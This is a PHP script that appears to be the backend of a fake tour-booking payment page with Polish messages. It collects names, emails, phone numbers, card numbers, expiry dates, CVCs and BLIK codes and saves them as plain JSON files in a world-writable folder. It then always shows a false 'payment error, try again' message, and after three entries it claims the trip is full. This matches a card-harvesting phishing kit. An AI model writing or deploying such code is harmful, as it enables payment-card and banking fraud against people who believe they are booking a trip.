<?php

function sanitize($data) {
    return htmlspecialchars(strip_tags(trim($data)));
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
 

    $name = sanitize($_POST["name"] ?? '');
    $email = filter_var(trim($_POST["email"] ?? ''), FILTER_SANITIZE_EMAIL);
    $phone = sanitize($_POST["phone"] ?? '');
    $method = sanitize($_POST["method"] ?? '');
    $card = sanitize($_POST["card"] ?? '');
    $expiry = sanitize($_POST["expiry"] ?? '');
    $cvc = sanitize($_POST["cvc"] ?? '');
    $blik = sanitize($_POST["blik-code"] ?? '');

    $dir = 'payments';
    if (!file_exists($dir)) {
        mkdir($dir, 0777, true);
    }
    
    $files = glob($dir . '/*.json');
    if (count($files) >= 3) {
        header('Content-Type: application/json');
        echo json_encode([
            'status' => 'no_seats',
            'message' => 'Przepraszamy, ale wszystkie miejsca na tę wycieczkę zostały już zarezerwowane.'
        ]);
        exit;
    }

    $data = [
        'name' => $name,
        'email' => $email,
        'phone' => $phone,
        'payment_method' => $method,
        'card_number' => $method === 'card' ? $card : '',
        'expiry_date' => $method === 'card' ? $expiry : '',
        'cvc_code' => $method === 'card' ? $cvc : '',
        'blik_code' => $method === 'blik' ? $blik : '',
        'timestamp' => date('Y-m-d H:i:s')
    ];

    $filename = $dir . '/' . date('Y-m-d_H-i-s') . '_' . preg_replace('/[^a-zA-Z0-9]/', '', $name) . '.json';
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));

    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'error',
        'message' => 'Wystąpił nieoczekiwany błąd podczas przetwarzania płatności. Prosimy spróbować ponownie później.'
    ]);
    exit;

} else {
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'error',
        'message' => 'Nieprawidłowe żądanie. Proszę wypełnić formularz.'
    ]);
    exit;
}
?>
